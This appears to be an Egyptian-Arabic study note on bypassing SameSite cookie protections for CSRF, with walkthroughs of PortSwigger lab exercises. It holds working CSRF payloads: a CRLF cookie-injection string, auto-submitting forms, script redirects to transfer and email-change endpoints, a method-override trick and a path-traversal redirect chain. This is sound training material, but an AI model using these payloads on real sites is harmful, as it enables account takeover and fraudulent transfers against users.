## **التحايل على قيود SameSite للكوكيز**

`SameSite` هي ميكانيزم أمان في المتصفحات بتحدد إمتى الكوكيز بتتبعت في الطلبات اللي جايه من مواقع تانية. القيود دي بتوفر **حماية جزئية** ضد **هجمات CSRF** و **التسريبات عبر المواقع** وبعض استغلالات `CORS`.

📌 **من 2021، متصفح Chrome بيطبق `Lax` كإعداد افتراضي** لو الموقع المصدر للكوكي مش محدد مستوى الحماية بنفسه. وده المفروض يبقى المعيار في المتصفحات التانية قريبًا.

## **🔹 إيه هو الـ Site في سياق SameSite؟**

🔹 **الموقع (Site)** بيتحدد على إنه الدومين الرئيسي (`TLD+1`) زي `.com` أو `.net` زائد مستوى إضافي.

✅ **مثال:**
- `http://app.example.com` و `https://app.example.com` **يُعتبروا Cross-Site** لإن البروتوكول (`http` و `https`) مختلف.
- `example.com` و `app.example.com` **يُعتبروا Same-Site** لكن مش `Same-Origin` لإن عندهم دومينات فرعية مختلفة.

## **🔹 الفرق بين Site و Origin؟**

⚡ **الموقع (Site)** بيشمل نطاقات فرعية كتير تحت نفس الدومين.
⚡ **الأصل (Origin)** بيحدد بروتوكول + دومين + بورت معين.

📌 **مثال عملي:**
| الطلب من | الطلب إلى | Same-Site? | Same-Origin? |
|------------|------------|------------|------------|
| `https://example.com` | `https://example.com` | ✅ نعم | ✅ نعم |
| `https://app.example.com` | `https://intranet.example.com` | ✅ نعم | ❌ لأ (اختلاف الدومين الفرعي) |
| `https://example.com` | `https://example.com:8080` | ✅ نعم | ❌ لأ (اختلاف البورت) |
| `https://example.com` | `https://example.co.uk` | ❌ لأ (اختلاف `eTLD`) | ❌ لأ |
| `https://example.com` | `http://example.com` | ❌ لأ (اختلاف البروتوكول) | ❌ لأ |

🚨 **الموضوع ده مهم لإن أي ثغرة بتسمح بتنفيذ جافاسكريبت على موقع معين ممكن تُستخدم في التحايل على قيود `SameSite` واستهداف مواقع تانية داخل نفس النطاق!**

---

## **🔹 إزاي بيشتغل SameSite؟**

زمان، قبل ما ميكانيزم `SameSite` يتطبق، المتصفحات كانت **بتبعت الكوكيز تلقائيًا مع أي طلب للموقع المصدر، حتى لو كان الطلب جاي من موقع تالت.**

📌 `SameSite` بيسمح لأصحاب المواقع **بالتحكم في الكوكيز اللي ممكن تتبعت عبر الطلبات اللي جايه من مواقع تانية، مما يقلل فرص هجمات `CSRF`.**

### **🔸 مستويات الحماية في SameSite:**

1️⃣ **Strict:** الكوكيز **مش هتتبعت نهائيًا** مع أي طلب Cross-Site.

2️⃣ **Lax:** الكوكيز **هتتبعت بس مع طلبات `GET` المباشرة** (زي لما تضغط على لينك).

3️⃣ **None:** الكوكيز **هتتبعت مع كل الطلبات** (حتى لو كانت Cross-Site)، لكن لازم تكون `Secure`.

✅ **مثال على تعيين كوكيز بنفسك:**
```http
Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
```

📌 **لو الموقع مش محدد `SameSite` بنفسه، Chrome تلقائيًا بيستخدم `Lax` كإعداد افتراضي.**

---

## **🔹 إزاي نتحايل على قيود SameSite؟**

🔹 **سيناريوهات التحايل الشائعة:**

1️⃣ **استغلال الدومينات الفرعية (`subdomains`) لإعداد الكوكي في الضحية.**

2️⃣ **استغلال إدراج محتوى عبر مواقع غير محمية (`iframes, redirects`).**

3️⃣ **استغلال وظائف البحث أو أي مدخلات بتنعكس في `Set-Cookie` للضحية.**

### **🔹 كود استغلال بسيط:**
✅ **لحقن كوكي `csrf` مزيف في متصفح الضحية:**
```http
/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
```

✅ **أو دمجها في `<img>` عشان يتم تنفيذها تلقائيًا:**
```html
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
```

---

# **تجاوز قيود SameSite Lax باستخدام GET Requests**

🔹 **السيرفر مش دايمًا بيكون صارم في التحقق من نوع الطلب** سواء كان **GET أو POST**، حتى لو الموقع متوقع إنه يكون **form submission** فقط. ولو الموقع بيستخدم **SameSite Lax** لحماية الكوكيز، ممكن تقدر تعمل **هجوم CSRF** عن طريق إجبار المتصفح على إرسال **طلب GET** من جهاز الضحية.

🔹 **المتصفح هيبعت الكوكيز في الطلب طالما إنه تنقل على مستوى الصفحة بالكامل،** وده ممكن يستغل لتنفيذ الهجوم بسهولة.

### **👾 كود استغلال بسيط للهجوم:**
```html
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```
✅ الكود ده بيجبر الضحية على تنفيذ **طلب GET** بدون ما يحس، وبالتالي لو الموقع بيقبل طلبات GET بدون حماية إضافية، ممكن يتم استغلاله بسهولة.

---

## **🔹 لو الموقع بيرفض GET Requests، فيه طريقة تانية؟**

🔹 بعض الفريم ووركات زي **Symfony** بتمكنك من تجاوز القيود دي عن طريق **تعديل الطريقة (Method Override)** داخل **HTML Form**.

### **👾 كود الاستغلال باستخدام POST مع Override:**
```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```
✅ الفكرة هنا إن بعض المواقع بتسمح بتغيير نوع الطلب عن طريق **_method=GET** في الفورم، وده ممكن يستخدم كوسيلة بديلة للهجوم.

---
# [Lab: SameSite Lax bypass via method override](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override)


### **ما هو Lax في SameSite Cookie؟**  
Lax هو إحدى القيم التي يمكن تعيينها لخاصية `SameSite` في ملفات تعريف الارتباط (Cookies) في المتصفحات. عند تعيين `SameSite=Lax`، يسمح المتصفح بإرسال الكوكي فقط مع الطلبات القادمة من نفس الموقع أو في **طلبات التنقل عبر الروابط (Top-level navigation GET requests)**، لكنه يمنع إرسال الكوكي مع **طلبات POST أو AJAX القادمة من مواقع أخرى**، مما يوفر بعض الحماية ضد هجمات CSRF (Cross-Site Request Forgery).  

**ببساطة:**  
- يسمح بإرسال الكوكي عند الضغط على رابط يؤدي إلى نفس الموقع.  
- يمنع إرسال الكوكي عند تنفيذ طلب تلقائي (مثل POST أو JavaScript fetch من موقع آخر).  

---

### **كيف تعرف أن الصفحة تستخدم `SameSite=Lax`؟**  
يمكنك معرفة ما إذا كانت الصفحة تستخدم `SameSite=Lax` للكوكيز من خلال عدة طرق:

#### **1- فحص الكوكيز في DevTools:**
- افتح **Developer Tools** في المتصفح (بالضغط على `F12` أو `Ctrl+Shift+I` في Chrome).  
- انتقل إلى **Application** > **Storage** > **Cookies**.  
- اختر الدومين الخاص بالموقع، وابحث عن الكوكي الذي تريد التحقق منه.  
- ستجد عمودًا باسم `SameSite` يعرض القيم (`Lax`, `Strict`, `None`).

#### **2- باستخدام Burp Suite أو أدوات HTTP Sniffing:**
- قم بإرسال طلب تسجيل الدخول أو أي طلب يقوم بإنشاء كوكي.  
- انتقل إلى **HTTP History** في Burp.  
- افحص **Set-Cookie Header** في الاستجابة (`Set-Cookie: session=xyz; SameSite=Lax`).

#### **3- مراقبة سلوك الجلسة عند إرسال طلبات من موقع مختلف:**
- حاول إرسال طلب `POST` من موقع آخر إلى الهدف.  
- إذا لم يتم إرسال الكوكي، فهذا يعني أن الموقع يستخدم `Lax` أو `Strict`.


![image](https://github.com/user-attachments/assets/04870f44-5828-48d2-b22f-954cee1a7b87)

✅ SameSite: None → هذا يعني أن الكوكي سيتم إرساله في جميع الطلبات، حتى عبر المواقع المختلفة (Cross-Site Requests)، مما يسمح بتمرير الكوكي في طلبات CSRF إذا لم يكن هناك حماية إضافية.

بعض التطبيقات تقوم بتعديل إعدادات الكوكيز ديناميكيًا بعد تسجيل الدخول.
من الممكن أن يكون:
عند تسجيل الدخول لأول مرة، الكوكي يستخدم SameSite=Lax.  بعد مرور بعض الوقت أو عند تنفيذ عمليات معينة، يتم تغيير الإعدادات إلىSameSite=None.

---
## ✅ ده شكل الريكويست 
```http
POST /my-account/change-email HTTP/1.1
Host: 0ad6007f03d775a7804dcb6200e90089.web-security-academy.net
Cookie: session=m1oOtZutw6vkmDHF0OlzrYzgqGqbpFyh

email=wiener1%40normal-user.net
```

## ✅ بما ان الموقع بيستخدم lax فمش هنقدر ننفذ csrf غير لما نبعت ال Request ب  GET طب ازاي نقدر نعمل كدا 

#### **1- هنجرب نتحايل في طلب GET نبعت POST :**  
```http
GET /my-account/change-email?email=wiener1%40normal-user.net&_method=POST
HTTP/2
Host: 0ad6007f03d775a7804dcb6200e90089.web-security-academy.net
Cookie: session=m1oOtZutw6vkmDHF0OlzrYzgqGqbpFyh

email=wiener1%40normal-user.net
```
#### **فعلا الطريقة نفعت لما استخدمت  &_method=POST في طلب GET :**  

```http
HTTP/2 302 Found
Location: /my-account?id=wiener
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

#### **2- دلوقتي هنحاول نستخدم الطريقة دي في CSRF POC عشان نبعته للضحية  :**  

```HTML
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>

    <script>
     document.location = "https://0ad6007f03d775a7804dcb6200e90089.web-security-academy.net/my-account/change-email?email=HACKER%40normal-user.net&_method=POST";
    </script>
  </body>
</html>
```

OR

```HTML
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a99000a030709c480740dbf00190073.web-security-academy.net/my-account/change-email" method="GET">
    <input type="hidden" name="_method" value="POST">

      <input type="hidden" name="email" value="wdienegru&#64;normal&#45;user&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
---
# [SameSite Strict bypass via client-side redirect](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect)

![image](https://github.com/user-attachments/assets/f8df58f6-0733-46b2-a5d9-71148f389aca)
![image](https://github.com/user-attachments/assets/a0906799-8590-4985-b76c-944946cc6b1d)


لو الكوكيز متضبطة على `SameSite=Strict`، المتصفح مش هيبعتها في أي طلبات عبر المواقع. لكن ممكن تلاقي طريقة للتحايل على القيد ده لو قدرت تلاقي وسيلة تعمل طلب تاني داخل نفس الموقع.

### إزاي ده ممكن يحصل؟
واحدة من الطرق هي إعادة توجيه من ناحية العميل (Client-side Redirect) باستخدام مدخلات يقدر المهاجم يتحكم فيها زي **معاملات URL**. يعني مثلًا، ممكن يستغل **إعادة التوجيه المفتوح القائم على الـDOM**.

### ليه دي مشكلة؟
المتصفحات بتتعامل مع عمليات إعادة التوجيه دي كأنها طلبات عادية مش إعادة توجيه فعلية، وده معناه إن الطلب بيُعتبر "نفس الموقع" **ويشمل كل الكوكيز** حتى لو فيه قيود.

### التأثير الأمني
لو المهاجم قدر يتحكم في الوسيلة دي بحيث تعمل طلب ضار تاني، يقدر يستخدمها لتخطي قيود `SameSite` تمامًا.


---
```HTTP
POST /my-account/change-email HTTP/2
Host: 0a1d00b903d8557280f8219e00f300e4.web-security-academy.net
Cookie: session=bc0hgNY5s0f6cj9I5COig9ahKxUeZ2ef

email=abdalrahmanhamdy%40std.mans.ed.eg&submit=1
```

## ✅ بما ان الموقع بيستخدم SameSite:"Strict"

#### **1- هنشوف مكان في الموقع نقدر نعمل فيه PATH TRAVIRSAL للمكان الي نقدر نعمل فيه cSRF :**  

```HTTP
GET /post/comment/confirmation?postId=4 HTTP/2
Host: 0a56005203b76863807f6cba00980018.web-security-academy.net
Cookie: session=AyzlXoSjLVpQZ3KF8EyIzImkFEC0w2TZ
```
```HTTP
GET /resources/js/commentConfirmationRedirect.js HTTP/2 
Host: 0a56005203b76863807f6cba00980018.web-security-academy.net
Cookie: session=AyzlXoSjLVpQZ3KF8EyIzImkFEC0w2TZ

redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```
#### ✅لاحظ أن هذا يستخدم معلمة Query PostID لإنشاء مسار إعادة توجيه جانب العميل بشكل ديناميكي.

#### ✅ ده مثلا ممكن نجرب نعمل فيه ../../../ ونشوف هيرجعنا للصفحة الاساسية ولا لا "


```HTTP
GET /post/comment/confirmation?postId=../../../ HTTP/2
Host: 0a56005203b76863807f6cba00980018.web-security-academy.net
Cookie: session=AyzlXoSjLVpQZ3KF8EyIzImkFEC0w2TZ
```
#### ✅ لقد قام باعاده توجيهي بنجاح  "
```
GET /post/comment/confirmation?postId=../../../my-account/change-email%3femail%3dHACKER%2540normal-user.net%26submit%3d1%26_method%3dPOST HTTP/2
Host: 0a56005203b76863807f6cba00980018.web-security-academy.net
Cookie: session=AyzlXoSjLVpQZ3KF8EyIzImkFEC0w2TZ
```


#### ✅ وهنا غيرلي الايميل برضو   "

### **2- دلوقتي هنعمل ال POC بس من الصفحة دي بحيث انها ترجع اليوزر لصفحة تغيير الايميل وينجح اختراقنا :**  

```HTML
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <script>
      document.location = "https://0a56005203b76863807f6cba00980018.web-security-academy.net/post/comment/confirmation?postId=../../../my-account/ change-email?email=ABDO%40normal-user.net%26submit=1";
    </script>
  </body>
</html>
```
